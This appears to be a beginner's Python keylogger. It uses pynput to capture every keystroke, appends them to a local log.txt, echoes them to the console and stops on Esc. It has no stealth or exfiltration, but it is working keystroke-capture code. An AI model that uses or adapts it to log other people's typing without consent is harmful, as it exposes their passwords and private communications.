import pynput                                       # pip install pynput, library
from pynput.keyboard import Key, Listener           # key listener 

keys = []                                           # initializes an empty list to store the keys that are pressed

def on_press(key):             # you press any key it store in file
    keys.append(key)
    write_file(keys)
    
    try:                       # it diffrencieat between alph & numeric keys
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):                             # pressed key stored in log.txt
    with open('log.txt', 'a') as f:  
        for key in keys:
            k = str(key).replace("'", "")         # key converted to a string
            f.write(k + ' ')
        keys.clear()

def on_release(key):                              # even 'Esc' key pressed condition false and listener off
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()